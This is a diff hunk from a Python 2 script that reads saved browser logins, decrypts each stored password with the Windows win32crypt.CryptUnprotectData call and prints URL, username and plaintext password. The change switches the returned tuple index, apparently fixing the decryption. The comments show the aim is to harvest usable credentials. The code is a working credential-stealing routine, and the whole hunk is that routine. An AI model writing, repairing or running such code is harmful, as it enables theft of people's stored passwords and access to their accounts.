@@ -24,7 +24,7 @@ except Exception, e: #Incase of error
 if len(data)>0: #Are there any autosaves?
 	for result in data: #Enumerate the autosaves
 		try:
-			password=win32crypt.CryptUnprotectData(result[2],None, None, None, 0)[0] #Gets password from data and ignores the description
+			password=win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1] #Gets password from data and ignores the description
 			if(str(result[0])!="" or (str(result[1])!="" and str(result[2])!="") ): #Please tell me that i can use this username and password for something or there is a username and password
 				print("%s,%s,%s" % (str(result[0]), str(result[1]), str(password))) #Print my stuff please
 		except Exception, e:
